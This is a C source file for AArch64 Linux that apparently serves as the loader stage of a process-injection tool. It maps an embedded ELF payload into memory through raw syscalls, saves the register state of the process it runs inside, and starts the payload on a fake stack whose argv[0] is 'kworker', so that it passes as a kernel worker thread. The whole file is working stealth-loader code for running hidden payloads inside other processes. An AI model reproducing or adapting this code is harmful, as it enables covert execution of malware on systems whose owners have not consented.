#include <elf.h>
#include <sys/mman.h>
#include <stdint.h>
#include "payload.h"
#include "reimplement.h"

#define ElfN_Ehdr Elf64_Ehdr
#define ElfN_Phdr Elf64_Phdr
#define ElfN_Addr Elf64_Addr
#define ElfN_Xword Elf64_Xword
#define ElfN_Off  Elf64_Off
#define MAX_SEGMENTS 16
#define PAGESIZE 4096

typedef struct {
    ElfN_Addr  vaddr;
    ElfN_Xword memsz;
    ElfN_Xword filesz;
    ElfN_Off   offset;
    ElfN_Xword  flags;
    ElfN_Xword align;
} load_segment;

struct cleanup {
    uint64_t x[31];       // x0-x30 from saved user_pt_regs.regs[]
    uint64_t sp;
    uint64_t pc;
    uint64_t pstate;
    uint64_t tpidr_el0;
    uint8_t  sigmask[128];
    uint64_t a_addr;
    uint64_t a_size;
    uint64_t b_addr;
    uint64_t clean_addr;
    uint64_t stack_addr;
    uint64_t loader_sp;
};

static inline int sys_mprotect(void *addr, unsigned long length, int prot) {
    register long x0 __asm__("x0") = (long)addr;
    register long x1 __asm__("x1") = length;
    register long x2 __asm__("x2") = prot;
    register long x8 __asm__("x8") = 226;
    __asm__ volatile (
            "svc #0"
            : "+r" (x0)
            : "r" (x1), "r" (x2), "r" (x8)
            : "memory", "cc"
    );
    return (int)x0;
}

int is_image_valid(ElfN_Ehdr *hdr) {
    if (sys_memcmp(hdr->e_ident, ELFMAG, SELFMAG) != 0) return 0;
    if (hdr->e_ident[EI_CLASS] != ELFCLASS64) return 0;
    if (hdr->e_machine != EM_AARCH64) return 0; 
    if (hdr->e_type != ET_DYN) return 0;
    if (hdr->e_phnum <= 0) return 0;
    return 1;
}

__attribute__((noreturn))
void arm_jump(ElfN_Addr sp, void *entry) {
    asm volatile(
        "mov sp, %0\n"
        "mov x0, xzr\n"
        "mov x1, xzr\n"
        "mov x2, xzr\n"
        "mov x3, xzr\n"
        "br %1\n"
        :
        : "r"(sp), "r"(entry)
        : "x0", "x1", "x2", "x3", "memory"
    );

    __builtin_unreachable();
}

int load_image(struct cleanup *clean, char *elf_start) {
    ElfN_Ehdr *hdr = (ElfN_Ehdr *)elf_start;
    if (!is_image_valid(hdr)) return 0;

    ElfN_Phdr *phdr = (ElfN_Phdr *)(elf_start + hdr->e_phoff);
    ElfN_Addr min_vaddr = UINT64_MAX;
    ElfN_Addr max_vaddr = 0;
    
    load_segment segments[MAX_SEGMENTS];
    int seg_count = 0;

    // Gather PT_LOAD segments
    for (int i = 0; i < hdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (seg_count >= MAX_SEGMENTS) return 0;
            segments[seg_count++] = (load_segment) {
                .vaddr = phdr[i].p_vaddr, .memsz = phdr[i].p_memsz,
                .filesz = phdr[i].p_filesz, .offset = phdr[i].p_offset,
                .flags = phdr[i].p_flags, .align = phdr[i].p_align
            };
            if (phdr[i].p_vaddr < min_vaddr) min_vaddr = phdr[i].p_vaddr;
            if ((phdr[i].p_vaddr + phdr[i].p_memsz) > max_vaddr) max_vaddr = phdr[i].p_vaddr + phdr[i].p_memsz;
        }
    }

    size_t memsz = max_vaddr - min_vaddr;

    size_t alloc_sz = memsz + PAGESIZE;

    ElfN_Addr pie_base = (ElfN_Addr)(((uintptr_t)clean->b_addr + (PAGESIZE - 1)) & ~(uintptr_t)(PAGESIZE - 1)) - min_vaddr;

    for (int i = 0; i < seg_count; i++) {
        void *dst = (void *)(pie_base + segments[i].vaddr); 
        void *src = (void *)(elf_start + segments[i].offset);
        sys_memcpy(dst, src, segments[i].filesz);
        if (segments[i].memsz > segments[i].filesz) {
            sys_memset((char *)dst + segments[i].filesz, 0, segments[i].memsz - segments[i].filesz); 
        }
    }

    // apply memory protections
    for (int i = 0; i < seg_count; i++) {
        uintptr_t start = pie_base + segments[i].vaddr;
        uintptr_t end   = start + segments[i].memsz;
        
        // mprotect requires page-aligned addresses
        uintptr_t aligned_start = start & ~(PAGESIZE - 1);
        uintptr_t aligned_end   = (end + PAGESIZE - 1) & ~(PAGESIZE - 1);
        
        int prot = 0;
        if (segments[i].flags & PF_R) prot |= PROT_READ;
        if (segments[i].flags & PF_W) prot |= PROT_WRITE;
        if (segments[i].flags & PF_X) prot |= PROT_EXEC;
        
        sys_mprotect((void *)aligned_start, aligned_end - aligned_start, prot);
    }

    void *entry_point = (void *)(pie_base + hdr->e_entry);

    // fake stack
    size_t stack_size = 3 * 1024 * 1024;
    
    char *sp = (char *)(uintptr_t)(clean->stack_addr + stack_size);

    sp -= 16;
    sys_memset(sp, 0x41, 16);
    char *randbuf = sp;

    sp -= 8;
    sys_memcpy(sp, "kworker\0", 8);
    char *execfn = sp;

    // argc(2) + argv[0](2) + argv_null(1) + envp_null(1) + auxv(10) = 16 words
    sp -= (16 * sizeof(ElfN_Addr));
    sp = (char *)((uintptr_t)sp & ~0xF); // Force strict 16-byte stack alignment
    
    ElfN_Addr *out = (ElfN_Addr *)sp;
    *out++ = 2;                            // argc
    *out++ = (ElfN_Addr)execfn;            // argv[0]
    *out++ = (ElfN_Addr)(uintptr_t)clean;  // argv[1]
    *out++ = 0;                            // argv terminator
    *out++ = 0;                            // envp terminator
    
    *out++ = AT_PHDR;   *out++ = pie_base + hdr->e_phoff;
    *out++ = AT_PHENT;  *out++ = hdr->e_phentsize;
    *out++ = AT_PHNUM;  *out++ = hdr->e_phnum;
    *out++ = AT_PAGESZ; *out++ = PAGESIZE;
    *out++ = AT_RANDOM; *out++ = (ElfN_Addr)randbuf;
    *out++ = AT_NULL;   *out++ = 0;

    arm_jump((ElfN_Addr)sp, entry_point);
    return 1;
}

__asm__ (
    ".section .text.entry\n"
    ".global _start\n"
    "_start:\n"
    "bl main_loader\n"
    "brk #0\n" // Trap if main_loader returns unexpectedly
);

__attribute__((used))
int main_loader(struct cleanup *clean) {
    load_image(clean, (char *)payload);
    return 0;
}